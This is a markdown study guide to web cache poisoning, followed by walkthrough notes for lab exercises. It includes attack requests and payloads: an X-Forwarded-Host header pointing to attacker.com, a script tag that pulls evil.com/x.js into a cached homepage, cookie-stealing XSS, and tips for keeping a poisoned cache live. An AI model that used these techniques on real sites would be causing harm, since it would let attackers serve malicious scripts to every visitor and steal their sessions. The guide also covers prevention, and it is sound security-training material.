# üõ° Web Cache Poisoning

## üìë Table of Contents
1. [What is Web Cache Poisoning?](#1Ô∏è‚É£-what-is-web-cache-poisoning)
2. [How Does a Web Cache Work?](#2Ô∏è‚É£-how-does-a-web-cache-work)
3. [Impact of a Web Cache Poisoning Attack](#3Ô∏è‚É£-impact-of-a-web-cache-poisoning-attack)
4. [Constructing a Web Cache Poisoning Attack](#4Ô∏è‚É£-constructing-a-web-cache-poisoning-attack)
5. [Exploiting Web Cache Poisoning Vulnerabilities](#5Ô∏è‚É£-exploiting-web-cache-poisoning-vulnerabilities)
6. [Prevention Techniques](#6Ô∏è‚É£-how-to-prevent-web-cache-poisoning-vulnerabilities)

---

## 1Ô∏è‚É£ What is Web Cache Poisoning?
Cache: Small, ***temporary storage*** that keeps frequently accessed data for quick access.

*Web-cache*  : Stores parts of a website (pages, images, scripts) so they can be served faster without always going back to the main server.

**Web cache poisoning** is an attack where an attacker manipulates a web server‚Äôs cache to store a **malicious HTTP response**.  
When other users request the same resource, they receive the **poisoned (malicious) response** instead of the intended one.

The attacker‚Äôs goal: **Serve malicious content to many users** via the cache without directly targeting each one.

---

## 2Ô∏è‚É£ How Does a Web Cache Work?
A **web cache** stores HTTP responses so that future requests for the same resource can be served quickly without re-fetching from the origin server.  
Types of caches:
- **Browser Cache** ‚Äì Stored on the client side.
- **CDN / Reverse Proxy Cache** ‚Äì Stored at network level (e.g., Cloudflare, Akamai).
- **Server Cache** ‚Äì Stored on the web server.

**Basic process:**
1. Client sends HTTP request.
2. Cache checks if a valid cached copy exists.
3. If yes ‚Üí serve cached response.  
   If no ‚Üí forward request to server ‚Üí store server‚Äôs response in cache ‚Üí serve to client.

üÖ∞Ô∏è **Keyed Cache** ::  A keyed cache is when the cache takes certain request parameters (query strings, headers, cookies, etc.) into account when deciding if a response is the same as a previously cached one.

``` Example 
GET /1.5 HTTP/2
Host: mozilla.com
```

üÖ±Ô∏è **Unkeyed Cache** :: An unkeyed cache is when the cache ignores certain request parameters, so multiple different requests can map to the same cached object.

``` Example 
User-Agent: Firefox/128.-desktop
Accept: application/json;q=0.9,*/*;q=0.2
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Hawk 
```
---
‚úÖ Check HTTP Response Headers

- curl -w "%{time_total}\n" -o /dev/null -s https://example.com
- curl -I https://example.com

- Most CDNs add cache status headers that indicate whether the content was served from cache or fetched from the origin server.

Common ones:

| CDN / Proxy  | Header Example                   | Meaning |
|--------------|----------------------------------|---------|
| **Cloudflare** | `CF-Cache-Status: HIT`           | Served from CDN cache |
| **CloudFront** | `X-Cache: Hit from cloudfront`   | Served from CDN cache |
| **Fastly**     | `X-Cache: HIT`                   | Served from cache |
| **Akamai**     | `X-Cache: TCP_HIT`               | Served from cache |
| **Varnish**    | `Age: 123`                       | Seconds since cached copy was fetched |
| **General**    | `Age` header                     | >0 means cached; 0 or missing likely means fresh from server |

```Example
CF-Cache-Status: HIT
MAX-AGE: 600
Age: 253
```

- This means the response was from a CDN‚Äôs cache and was cached 253 seconds ago.
- Look at Response Headers for CDN-specific headers (CF-, X-Cache, Age, etc.).
---

## 3Ô∏è‚É£ Impact of a Web Cache Poisoning Attack
- **Widespread XSS** ‚Äì Inject JavaScript into cached responses.
- **Defacement** ‚Äì Alter content displayed to all users.
- **Phishing** ‚Äì Redirect cached pages to malicious sites.
- **Credential Theft** ‚Äì Inject scripts to steal cookies/session tokens.
- **Service Disruption** ‚Äì Deliver broken or malicious responses to legitimate users.

---

## 4Ô∏è‚É£ Constructing a Web Cache Poisoning Attack

### Step 1: Identify and Evaluate Unkeyed Inputs
- **Unkeyed inputs** are parts of the HTTP request that affect the response **but are not part of the cache key**.
- Example: HTTP headers like `X-Forwarded-Host` or query parameters ignored by the cache.
- **Why it matters:** If the cache ignores an input but the server processes it, you can control the cached output.


### Step 2: Param Miner
- Use **Burp Suite‚Äôs Param Miner extension** to automatically guess:
  - Hidden parameters
  - Non-standard HTTP headers
  - Inputs that may influence server behavior but not the cache key.
- This helps find cache poisoning vectors.

### Step 3: Elicit a Harmful Response from the Back-End Server
- Manipulate the unkeyed input to:
  - Trigger **JavaScript injection** (for XSS)
  - Add **malicious redirects**
  - Alter HTML responses
- Example:
  ```http
  GET / HTTP/1.1
  Host: victim.com
  X-Forwarded-Host: attacker.com
  ```
- Possible payloads:
	- Inject HTML/JS (<script>alert(1)</script>)
	- Change redirect URLs
	- Alter API responses

### Step 4: Get the Response Cached
- Ensure the poisoned response is cacheable:
	- Cache-Control should allow caching (no no-store or private).
	- Sometimes removing cookies (Set-Cookie) makes it cacheable.
- Verify:
	- Send multiple requests ‚Üí see if same response is served without origin server hit.
- Tip: Use Burp‚Äôs Repeater to replay and check if response changes between requests.


### Step 5: Deliver the Poisoned Cache to Victims
- Once the malicious response is cached:
	- Anyone requesting the same URL will get the poisoned content.
	- Works on CDN edges globally if CDN caching is enabled.
- Example:
	- Inject <script src="https://evil.com/x.js"></script> into homepage.
	- Cached at CDN ‚Üí All visitors worldwide load attacker‚Äôs script.

### Step 6: Monitor Cache Behavior
Determine:
- Cache expiry time (`max-age`, `Expires` header).
- Whether partial requests (query params) map to the same cache entry.
- If multiple caches are in the chain (browser ‚Üí CDN ‚Üí reverse proxy).

**Goal:** Maximize reach by understanding cache hierarchy.

### Step 7: Maintain or Refresh the Poison
Some caches may expire quickly.

To persist the attack:
- Periodically resend the poisoning request before expiry.
- Automate refresh with a script or scheduler.

**Note:** This can keep the attack live indefinitely until detected.

## 5Ô∏è‚É£ Exploiting Web Cache Poisoning Vulnerabilities
Once cached, the poisoned content:
- Affects all users who request that cached resource.
- Can persist until cache expiry or manual purge.

**Example scenario:**
1. Attacker injects: into homepage
   ```html
   <script src="https://evil.com/x.js"></script>
   ```
2. Cache stores this malicious page.
3. All visitors load attacker‚Äôs script.

### 6Ô∏è‚É£ How to Prevent Web Cache Poisoning Vulnerabilities

1. Normalize Requests
	- Ensure cache and server process requests identically.
	- Include all user-controllable inputs in cache key.
	- Avoid unkeyed input issues.

2. Sanitize User Input
	- Never reflect unsanitized data in cached responses.

3. Set Strict Caching Rules
	- Use Cache-Control: no-store for dynamic/user-specific content.

4. Whitelist Headers and Parameters
	- Reject or ignore unexpected ones.

5. Security Testing
	- Test with tools like Burp Suite and Param Miner.
	- simulate poisoning scenarios in staging environments.
---

## üî¨ LBA's


- Exploiting cache design flaws
- Exploiting cache implementation flaws



# Exploiting-design-flaws

### Lab: Web cache poisoning with an unkeyed header

Approch : 
- Find the GET request for the home page
- Add a cache-buster query parameter, such as ?abc=1234 --> Testing 
- find unkeyed header : using param miner

exploit :
- X-Forwarded-Host : hacker.com



### Lab: Web cache poisoning with an unkeyed cookie
- Place a suitable XSS payload in the fehost cookie, for :
fehost="-alert(1)-"


### Lab: Web cache poisoning with multiple headers

- Find the GET request for the JavaScript file /resources/js/tracking.js
- X-Forwarded-Scheme: HTTPS, you receive a 302 response with loaction.
- Add the X-Forwarded-Scheme: http  &&  X-Forwarded-Host: example.com and  
	-  redirect now points to https://example.com/. 

### Lab: Targeted web cache poisoning using an unknown header

####  ***(Vary: User-Agent)*** : It's mean user agaent is a part of keycache

- In this lab we need to posion User-agent 

- First need to find unkeyed caches using param-miner
- Notice that the Vary header is used to specify that the User-Agent is part of the cache key. need to find out their User-Agent.
- Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example:
```example
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
```
- check the logs of exploit server :
- got the victim  ::: "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
- Posion that user-agent



### Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

- Intercept the home page request in Burp, send to Repeater.
- Use Param Miner to find X-Forwarded-Host is supported.
-	Add a cache buster + X-Forwarded-Host: example.com ‚Üí see it overwrite data.host in initGeoLocate() (DOM-XSS vulnerable).
-	On exploit server, host /resources/json/geolocate.json with:
``` Payload
{"country":"<img src=1 onerror=alert(document.cookie) />"}
```
-	Add header: Access-Control-Allow-Origin: *.
-	In Burp, set X-Forwarded-Host to your exploit server domain.
-	Send until X-Cache: hit (avoid Set-Cookie responses by using a request after session cookie is set).
-	Visit the poisoned page in a browser ‚Üí alert pops.


### Lab: Combining web cache poisoning vulnerabilities
- ***Identify the injection points***
		- In Burp Proxy > HTTP history, load the homepage /.
		-	Use Param Miner ‚Üí find X-Forwarded-Host and X-Original-URL are supported.
- Confirm the translation injection
- Send the request for:
```
/?localized=1
X-Forwarded-Host: YOUR-ID.exploit-server.net
Cookie: lang=es
```
- Send ‚Üí check that the response loads your JSON from exploit server.
- Load it in browser ‚Üí alert() fires ‚Üí confirmed.

- Poison the cache with malicious translation


<br>

# Exploiting cache implementation flaws

### Lab